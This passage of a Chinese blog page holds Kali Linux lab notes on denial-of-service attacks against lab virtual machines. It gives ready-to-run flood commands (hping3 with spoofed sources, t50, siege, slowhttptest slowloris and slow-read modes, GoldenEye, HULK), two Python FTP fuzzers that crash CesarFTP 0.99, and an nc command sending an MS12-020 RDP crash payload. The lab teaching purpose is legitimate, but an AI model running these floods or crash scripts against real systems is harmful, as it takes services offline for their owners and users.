<li>GoldenEye<ul>
<li>http/https拒绝服务攻击工具</li>
<li>安全研究位目的的Python脚本</li>
<li>随机攻击向量，keep-alive，避免缓存命中</li>
<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
<li><strong><code>🔺命令：./goldeneye.py -h</code></strong>（▲ 查看goldeneye选项）</li>
<li><strong><code>🔺命令：./goldeneye.py http://1.1.1.1 -w 50</code></strong></li>
<li>▲ -w（僵尸机）</li>
<li>▲ 2020.2.13 此工具运行后抓包无发生数据</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0145gE5wtPPVUhL8XXRl868QS9C_7JodUhFbisUR9vzy2Iekbrj5sJO3Bq6c_Wu9hGzqBB_BKnTKYWmV9du3bgB_99YpZjhnccmZMUPNGMDsEbW-bw&file_name=/XOIC.PNG" alt="XOIC"></p>
<h4 id="4-实验–RUDY"><a href="#4-实验–RUDY" class="headerlink" title="4. 实验–RUDY"></a>4. 实验–RUDY</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>物理机上拷贝下载的RUDY文件，进行解压查看，可以修改配置文件rudeadyet.conf</li>
<li>浏览器访问Metasploit尝试连接，找出表单对应的变量名称</li>
<li>修改配置文件rudeadyet.conf（URL、attack_parameters）</li>
<li><strong><code>🔺命令：./r-u-dead-yet-v2.2.py</code></strong></li>
<li>可通过Wireshark抓包，查看发送的数据包（TCP segement byte是否为一个字节）</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f951l0uyfrfspIYoEovNh8JiJ2YhGEs5csqy_g7RDofyQr951iX7tB5H9fuIK2NEZMABOF47-qKH1UgDjJITYpuWX2pYhW6B9HYUgDGQMK4EiVXUMiX8aOJfrA&file_name=/rudy%E6%94%BB%E5%87%BB.PNG" alt="Rudy攻击"></p>
<h4 id="5-实验–hping3"><a href="#5-实验–hping3" class="headerlink" title="5. 实验–hping3"></a>5. 实验–hping3</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：hping3 -a Metasploit的IP -S -d 100 -p 80 --flood Metasploit的IP</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="6-实验–nping"><a href="#6-实验–nping" class="headerlink" title="6. 实验–nping"></a>6. 实验–nping</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="7-实验–siege"><a href="#7-实验–siege" class="headerlink" title="7. 实验–siege"></a>7. 实验–siege</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：siege -g http://Metasploit的IP/a.php / Metasploit的IP</code></strong>（查看banner信息）</li>
<li><strong><code>🔺命令：siege -i（互联网形式） -c 1000 http://Metasploit的IP/a.php -A（user-agent） siegehttp</code></strong></li>
<li><strong><code>🔺命令：siege -i -c 1000</code></strong>（去默认文件夹寻找URL地址）</li>
<li>可通过Wireshark抓包，查看发送的数据包</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="8-实验–t50"><a href="#8-实验–t50" class="headerlink" title="8. 实验–t50"></a>8. 实验–t50</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig查看IP地址</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i eth0 -s 0 -vv | netstat -antu | more</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：t50 Metasploit的IP --flood --turbo -S --protocol TCP --dport 80</code></strong></li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="9-实验–匿名者拒绝服务工具包"><a href="#9-实验–匿名者拒绝服务工具包" class="headerlink" title="9. 实验–匿名者拒绝服务工具包"></a>9. 实验–匿名者拒绝服务工具包</h4><ul>
<li>▲ 工具包都为.exe文件，所以可能无法在Kali上运行（即使有mono界面/wine程序）</li>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>使用LOIC攻击进行尝试，浏览器访问Metasploit尝试连接（更改Attack options进行尝试）</li>
<li>使用HOIC攻击进行尝试，浏览器访问Metasploit尝试连接（不要下载Booster）</li>
<li>使用DDoSer攻击进行尝试，浏览器访问Metasploit尝试连接（字符界面）</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7d26jTimjz2vgXii_bPcR4_P8BtE-e8OmqJwOeMI_ElfUn-qD4G3QS6um4B08BzjK_QY1idU2rVz0x8mfOh7EgKjqQ6VPHAP4QebxDkhYCokc0ijYg&file_name=/LOIC.PNG" alt="LOIC"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=82fcdNouj3c_14RdAOZqSvvCV8NFBfHRY7fHVKGHbi1KiGYtEYItEih71Vt93720hD_lJU5NihHQnyVJGajzknqFfYMilYUde8iZ7Y0tu6_qsiWMaA&file_name=/HOIC.PNG" alt="HOIC"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6ef5qTUXGYnIfkf1Hxhc9UZr5Vn0SG8iPZhjq3AXo_VCu9Terc0yhUVUwVHp1KE4biO8df0A6Hlcp0LmA_Xsj6kvexjXEuc3YdFM8Bjc-scwljPCc2-e&file_name=/DDoSer.PNG" alt="DDoSer"></p>
<h4 id="10-实验–HULK"><a href="#10-实验–HULK" class="headerlink" title="10. 实验–HULK"></a>10. 实验–HULK</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>从物理机拷贝HULK工具</li>
<li><strong><code>🔺命令：python hulk.py http://Metasploit的IP地址</code></strong></li>
<li>开启Wireshark抓包，Fllow → TCP Stream 查看GET数据包情况（多个数据包分析）</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=318cWujI2Ac8UmcXyCS7OeLXvX2ZzNa5q8Bee_XKEvwCcFf6Ncq9u21zpgayrWvLv6TuiBIJyvCrXiLb48hdJ3N3wypIomne2yFZnnKeJBj7vd6X2w&file_name=/HULK.PNG" alt="HULK"></p>
<h4 id="11-实验–GoldenEye"><a href="#11-实验–GoldenEye" class="headerlink" title="11. 实验–GoldenEye"></a>11. 实验–GoldenEye</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
<li><strong><code>🔺命令：./goldeneye.py http://Metasploit的IP地址 -w 50</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
<li>开启Wireshark抓包，查看数据包</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=dc15B73PwwlawMt1L4zxDTbDFV5a9WqSXAWHtHo21SLvZ4phCvHlvKiwk7zwY5KShx0E0KxR1YnJ3q6A6lWneQ90-xtmBGY0hRyaDtwQGfZ9Vg4We2d6vyEj&file_name=/GoldenEye.PNG" alt="GoldenEye"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/" itemprop="url">Kali Linux笔记(八十六)：应用层DoS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T12:52:37+08:00">
                2020-02-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.9k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-应用层DoS"><a href="#1-应用层DoS" class="headerlink" title="1. 应用层DoS"></a>1. 应用层DoS</h4><ul>
<li>应用服务漏洞<ul>
<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
</ul>
</li>
<li>缓冲区溢出漏洞<ul>
<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
<li>影响：远程代码执行、DoS</li>
<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
</ul>
</li>
<li>CesarFTP 0.99服务漏洞<ul>
<li>ftp_fuzz.py  #MKD/RMD（特殊字符：/n）</li>
</ul>
</li>
<li>MS12-020远程桌面协议DoS漏洞</li>
<li>Slowhttptest（源自google）<ul>
<li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li>
<li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li>
<li>尤其擅长攻击apache、tomcat（几乎百发百中）</li>
<li>支持代理</li>
<li>大量应用服务器和安全设备都无法防护慢速攻击</li>
</ul>
</li>
<li>Slowhttptest攻击方法<ul>
<li>Slowloris、Slow HTTP POST攻击<ul>
<li>耗尽应用的并发连接池，类似于Http层的Syn flood（非TCP连接数）</li>
<li>HTTP协议默认在服务器全部被接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li>
<li>Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n…..</li>
<li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送</li>
</ul>
</li>
<li>Slow Read attack<ul>
<li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li>
<li>不同之处在于请求正常发送，但慢速读取响应数据</li>
<li>攻击者调整TCP window窗口大小，是服务器慢速返回数据</li>
</ul>
</li>
<li>Apache Range Header attack<ul>
<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
<li>耗尽服务器CPU、内存资源</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-a start</td>
<td align="center">start value of ranges-specifier for range header test</td>
</tr>
<tr>
<td align="center">-b bytes</td>
<td align="center">limit of range-specifier for range header test</td>
</tr>
<tr>
<td align="center">-c number of connections</td>
<td align="center">limited of 65539</td>
</tr>
<tr>
<td align="center">-d proxy host:port</td>
<td align="center">for directing all traffic through web proxy</td>
</tr>
<tr>
<td align="center">-e proxy host:port</td>
<td align="center">for directing only probe traffic through web proxy</td>
</tr>
<tr>
<td align="center">-H,B,R or X</td>
<td align="center">specify to slow down in headers section or in message body,-R enables range test,-X enables slow read test</td>
</tr>
<tr>
<td align="center">-g</td>
<td align="center">generate statistics in CSV and HTML formats,pattern is slow_xxx.csv/heml,where xxx is the time and date</td>
</tr>
<tr>
<td align="center">-i seconfs</td>
<td align="center">interval between follow up datai seconds,per connection</td>
</tr>
<tr>
<td align="center">-k pipeline factor</td>
<td align="center">number of times to repeat the request in the same connection for slow read test if server supports HTTP pipe-lining</td>
</tr>
<tr>
<td align="center">-l seconds</td>
<td align="center">test duration in seconds</td>
</tr>
<tr>
<td align="center">-n seconds</td>
<td align="center">interval between read operation from receive buffer</td>
</tr>
<tr>
<td align="center">-o file</td>
<td align="center">custom output file path and/or name,effective if -g is specified</td>
</tr>
<tr>
<td align="center">-p seconds</td>
<td align="center">timeout to wait for HTTP response on probe connction,after which serber is considered inaccessible</td>
</tr>
<tr>
<td align="center">-r connections per second</td>
<td align="center">connection rate</td>
</tr>
<tr>
<td align="center">-s bytes</td>
<td align="center">value of Content-Length header,if -B specified</td>
</tr>
<tr>
<td align="center">-t verb</td>
<td align="center">custom verb to use</td>
</tr>
<tr>
<td align="center">-u URL</td>
<td align="center">target URL,the same formaat you type in browser,eg https:host[:port]</td>
</tr>
<tr>
<td align="center">-v level</td>
<td align="center">verbosity level of log 0-4</td>
</tr>
<tr>
<td align="center">-w bytes</td>
<td align="center">start of range the advertised window size would be picked from</td>
</tr>
<tr>
<td align="center">-x bytes</td>
<td align="center">max length of follow up data</td>
</tr>
<tr>
<td align="center">-y bytes</td>
<td align="center">end of range the advertised window size would be picked from</td>
</tr>
<tr>
<td align="center">-z bytes</td>
<td align="center">bytes to read from receive buffer with single read() operation</td>
</tr>
</tbody></table>
<h4 id="2-实验–CesarFTP-0-99服务漏洞"><a href="#2-实验–CesarFTP-0-99服务漏洞" class="headerlink" title="2. 实验–CesarFTP 0.99服务漏洞"></a>2. 实验–CesarFTP 0.99服务漏洞</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>保存从主机下载的CesarFTP，并安装保存，打开运行程序Server（需要通过防火墙）</li>
<li>双击打开CesarFTP控制端程序进行配置 → 用户/组 → 添加用户 → anonymous</li>
<li>文件存取权限 → 选取一个文件夹作为主目录</li>
<li>cmd → <strong><code>🔺命令：netstat -nao</code></strong>查看21端口是否开启</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：./ftp_fuzz.py</code></strong></li>
<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [载荷] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 A 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">char = sys.argv[3]</span><br><span class="line">i= int(sys.argv[4])</span><br><span class="line">step = int(sys.argv[4])</span><br><span class="line">max= int(sys.argv[5])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (char*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个（ &quot;+ char + &quot;）&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：./ftp_fuzz1.py</code></strong></li>
<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 5:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">i= int(sys.argv[3])</span><br><span class="line">step = int(sys.argv[3])</span><br><span class="line">max= int(sys.argv[4])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (&quot;\n&quot;*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个换行符&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>

<h4 id="3-实验–MS12-020远程桌面协议DoS漏洞"><a href="#3-实验–MS12-020远程桌面协议DoS漏洞" class="headerlink" title="3. 实验–MS12-020远程桌面协议DoS漏洞"></a>3. 实验–MS12-020远程桌面协议DoS漏洞</h4><ul>
<li>Window XP SP3<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>⭐ 2020.2.11开启远程桌面</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
在Terminal Server键下，你将发现一个名为fDenyTSConnection的REG_DWORD型键值。双击这个键值打开“编辑DWORD值”对话框，把1(禁用远程桌面)改成0(启用远程桌面)</code></pre></blockquote>
<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：searchsploit ms12-020</code></strong></li>
<li><strong><code>🔺命令：cat /usr/share/exploitdb/platforms/windows/doc/18606.txt</code></strong></li>
<li>下载termdd_1.dat</li>
<li><strong><code>🔺命令：nc Window XP SP3的IP 3389 &lt; termdd_1.dat</code></strong>（多次运行才可能生效）</li>
</ul>
</li>
</ul>
<h4 id="4-实验–Slowhttptest"><a href="#4-实验–Slowhttptest" class="headerlink" title="4. 实验–Slowhttptest"></a>4. 实验–Slowhttptest</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>slowhttptest<ul>
<li>-c（建立的连接数，最大值为65539）</li>
<li>-H（slowloris攻击方式）</li>
<li>-g/-o（输出结果）</li>
<li>-i（间隔的时间）</li>
<li>-r（请求速率也即每次建立的连接数）</li>
<li>-t（请求的方法）</li>
<li>-u（攻击的URL）</li>
<li>-p（三秒不回则为宕机）</li>
<li>-l（攻击时间）</li>
<li>-B（HTTP POST 攻击模式）</li>
</ul>
</li>
<li>▲ slowloris 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://Metasploit的IP -x 24 -p 3</code></strong> </li>
</ul>
</li>
<li>▲ Apache Range Header attack 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -R -u http://Metasploit的IP -t HEAD -c 1000 -a 10 -b 3000 -r 500</code></strong></li>
</ul>
</li>
<li>▲ HTTP POST 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://Metasploit的IP -x 10 -p 3</code></strong></li>
</ul>
</li>
<li>▲ Slow Read attack 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://Metasploit的IP -p 3</code></strong></li>
</ul>
</li>
<li>浏览器访问Metasploit尝试连接，在根目录下生成my_header_stats.csv/my_header_stats.html文件</li>
<li>定制连接数：<strong><code>🔺命令：ulimite -n 70000</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-另类的拒绝服务"><a href="#5-另类的拒绝服务" class="headerlink" title="5. 另类的拒绝服务"></a>5. 另类的拒绝服务</h4><ul>
<li>炸邮箱<ul>
<li>使用垃圾邮件塞满邮箱</li>
</ul>
</li>
<li>无意识的/非故意的拒绝服务攻击<ul>
<li>数据库服务器宕机恢复后引用队列大量请求洪水涌来</li>
<li>告警邮件在邮件服务器修改地址后洪水攻击防火墙</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
